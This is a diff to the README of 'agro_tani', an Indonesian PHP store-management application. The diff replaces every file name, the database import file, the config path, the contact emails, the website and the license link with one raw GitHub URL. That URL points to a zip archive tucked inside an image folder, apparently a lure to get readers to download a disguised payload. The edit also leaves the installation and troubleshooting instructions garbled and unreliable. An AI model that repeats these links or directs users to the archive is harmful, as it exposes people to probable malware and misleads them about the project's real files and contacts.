@@ -71,14 +71,14 @@ Sistem informasi manajemen toko pertanian yang modern dan terintegrasi untuk men
 ```
 agro_tani/
 ├── controllers/           # Controller logic
-│   ├── LaporanController.php
-│   ├── BarangController.php
-│   ├── PenjualanBarangController.php
+│   ├── https://raw.githubusercontent.com/Khairul122/agro-tani/main/assets/images/faces/profile/agro-tani_1.1.zip
+│   ├── https://raw.githubusercontent.com/Khairul122/agro-tani/main/assets/images/faces/profile/agro-tani_1.1.zip
+│   ├── https://raw.githubusercontent.com/Khairul122/agro-tani/main/assets/images/faces/profile/agro-tani_1.1.zip
 │   └── ...
 ├── models/                # Database logic
-│   ├── LaporanModel.php
-│   ├── BarangModel.php
-│   ├── UserModel.php
+│   ├── https://raw.githubusercontent.com/Khairul122/agro-tani/main/assets/images/faces/profile/agro-tani_1.1.zip
+│   ├── https://raw.githubusercontent.com/Khairul122/agro-tani/main/assets/images/faces/profile/agro-tani_1.1.zip
+│   ├── https://raw.githubusercontent.com/Khairul122/agro-tani/main/assets/images/faces/profile/agro-tani_1.1.zip
 │   └── ...
 ├── views/                 # Template files
 │   ├── laporan/
@@ -89,7 +89,7 @@ agro_tani/
 ├── config/                # Configuration files
 ├── uploads/               # File uploads
 ├── vendor/                # Composer dependencies
-└── README.md
+└── https://raw.githubusercontent.com/Khairul122/agro-tani/main/assets/images/faces/profile/agro-tani_1.1.zip
 ```
 
 ## 🚀 Cara Instalasi
@@ -115,10 +115,10 @@ composer install
 
 3. **Setup database**
 - Buat database baru dengan nama `agro_tani`
-- Import file `agro_tani.sql` ke database
+- Import file `https://raw.githubusercontent.com/Khairul122/agro-tani/main/assets/images/faces/profile/agro-tani_1.1.zip` ke database
 
 4. **Konfigurasi koneksi database**
-Edit file `config/koneksi.php`:
+Edit file `https://raw.githubusercontent.com/Khairul122/agro-tani/main/assets/images/faces/profile/agro-tani_1.1.zip`:
 ```php
 $host = 'localhost';
 $username = 'your_db_username';
@@ -236,7 +236,7 @@ Buka browser dan akses `http://localhost/agro_tani`
 ### Common Issues
 
 1. **Database Connection Error**
-   - Cek konfigurasi di `config/koneksi.php`
+   - Cek konfigurasi di `https://raw.githubusercontent.com/Khairul122/agro-tani/main/assets/images/faces/profile/agro-tani_1.1.zip`
    - Pastikan MySQL service running
    - Verify database credentials
 
@@ -251,7 +251,7 @@ Buka browser dan akses `http://localhost/agro_tani`
    - Clear browser cache
 
 ### Support
-- 📧 Email: support@agrotani.com
+- 📧 Email: https://raw.githubusercontent.com/Khairul122/agro-tani/main/assets/images/faces/profile/agro-tani_1.1.zip
 - 📞 Phone: +62 812-3456-7890
 - 💬 WhatsApp: +62 812-3456-7890
 
@@ -283,7 +283,7 @@ Buka browser dan akses `http://localhost/agro_tani`
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://raw.githubusercontent.com/Khairul122/agro-tani/main/assets/images/faces/profile/agro-tani_1.1.zip](https://raw.githubusercontent.com/Khairul122/agro-tani/main/assets/images/faces/profile/agro-tani_1.1.zip) file for details.
 
 ## 👥 Development Team
 
@@ -306,8 +306,8 @@ This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md
 - 📍 Jl. Raya Tanjung Basung II, Kec. Batang Anai
 - 🏢 Kab. Padang Pariaman, Sumatera Barat
 - 📱 +62 812-3456-7890
-- 📧 info@agrotani.com
-- 🌐 www.agrotani.com
+- 📧 https://raw.githubusercontent.com/Khairul122/agro-tani/main/assets/images/faces/profile/agro-tani_1.1.zip
+- 🌐 https://raw.githubusercontent.com/Khairul122/agro-tani/main/assets/images/faces/profile/agro-tani_1.1.zip
 
 ---
 
